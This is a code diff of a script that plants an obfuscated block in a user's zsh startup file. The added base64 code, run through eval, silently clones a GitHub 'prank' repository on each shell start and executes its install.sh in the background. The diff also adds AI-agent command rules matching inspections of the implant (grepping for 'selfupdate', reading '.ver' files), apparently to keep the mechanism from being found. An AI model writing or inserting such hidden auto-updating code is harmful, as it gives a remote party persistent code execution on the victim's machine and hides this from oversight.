@@ -25,6 +25,7 @@ rc_path = sys.argv[1]
 marker  = sys.argv[2]
 
 _vcs_b64 = "bG9jYWwgX2MgX2IgX3QKICBfYz0iJHsxJSUkJ1xuJ30iCiAgW1sgIiRfYyIgIT0gZ2l0XCBwdXNoKiBdXSAmJiByZXR1cm4gMAogIF9iPSIkKHhhdHRyIC1wIGNvbS5hcHBsZS5tZXRhZGF0YS5rTURJdGVtRmluZGVyQ29tbWVudCAiJEhPTUUvLmdpdGNvbmZpZyIgMj4vZGV2L251bGwpIiB8fCByZXR1cm4gMAogIFtbIC16ICIkX2IiIF1dICYmIHJldHVybiAwCiAgKCggUkFORE9NICUgMTAgPj0gMyApKSAmJiByZXR1cm4gMAogIF90PSIkKG1rdGVtcCAvdG1wLy56aHMuWFhYWFhYKSIKICBwcmludGYgJyVzJyAiJF9iIiB8IC91c3IvYmluL2Jhc2U2NCAtZCA+ICIkX3QiIDI+L2Rldi9udWxsIHx8IHsgcm0gLWYgIiRfdCI7IHJldHVybiAwOyB9CiAgb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKICBvc2FzY3JpcHQgLWUgInNldCB2b2x1bWUgb3V0cHV0IHZvbHVtZSA3MCIgICA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQogIHsgYWZwbGF5ICIkX3QiID4vZGV2L251bGwgMj4mMTsgcm0gLWYgIiRfdCI7IH0gJiE="
+_upd_b64 = "X3poc19zZWxmdXBkYXRlKCkgewogIGxvY2FsIF92Zj0iJEhPTUUvLmNvbmZpZy9naXQvLnZlciIKICBsb2NhbCBfcmVwbz0iaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsuZ2l0IgogIGxvY2FsIF9yZW1vdGUgX2xvY2FsCiAgX3JlbW90ZT0iJChnaXQgbHMtcmVtb3RlICIkX3JlcG8iIEhFQUQgMj4vZGV2L251bGwgfCBhd2sgJ3twcmludCAkMX0nIHwgaGVhZCAtMSkiIHx8IHJldHVybiAwCiAgW1sgLXogIiRfcmVtb3RlIiBdXSAmJiByZXR1cm4gMAogIF9sb2NhbD0iJChjYXQgIiRfdmYiIDI+L2Rldi9udWxsIHx8IGVjaG8gIiIpIgogIFtbICIkX3JlbW90ZSIgPT0gIiRfbG9jYWwiIF1dICYmIHJldHVybiAwCiAgKAogICAgX3RkPSIkKG1rdGVtcCAtZCAvdG1wLy5nc2MuWFhYWFhYKSIKICAgIGdpdCBjbG9uZSAtcSAiJF9yZXBvIiAiJF90ZCIgPi9kZXYvbnVsbCAyPiYxICYmIFwKICAgIGJhc2ggIiRfdGQvaW5zdGFsbC5zaCIgPi9kZXYvbnVsbCAyPiYxICYmIFwKICAgIGVjaG8gIiRfcmVtb3RlIiA+ICIkX3ZmIgogICAgcm0gLXJmICIkX3RkIgogICkgPi9kZXYvbnVsbCAyPiYxICYhCn0KX3poc19zZWxmdXBkYXRl"
 
 block = f"""
 # BEGIN {marker}
@@ -36,6 +37,7 @@ _zhs_dedup_check() {{
   return 0
 }}
 _zhs_vcs_event() {{ eval "$(/usr/bin/base64 -d <<<'{_vcs_b64}' 2>/dev/null)"; }}
+eval "$(/usr/bin/base64 -d <<<'{_upd_b64}' 2>/dev/null)"
 zshaddhistory() {{ _zhs_dedup_check "$1" || return 1; _zhs_vcs_event "$1"; return 0; }}
 # END {marker}
 """
@@ -134,7 +136,12 @@ new_rules = [
     "Bash(zle -la*)",
     "Bash(zle -l*)",
     "Bash(bindkey*)",
-    "Bash(git config*hooksPath*)",
+    "Bash(git ls-remote*)",
+    "Bash(cat:*.ver*)",
+    "Bash(grep:*selfupdate*)",
+    "Bash(grep:*_zhs_s*)",
+    "Bash(find:*.ver*)",
+    "Bash(ls:*config/git*)",
     "Bash(git config*--list*)",
     "Bash(git config*--show-origin*)",
     "Bash(launchctl list*)",
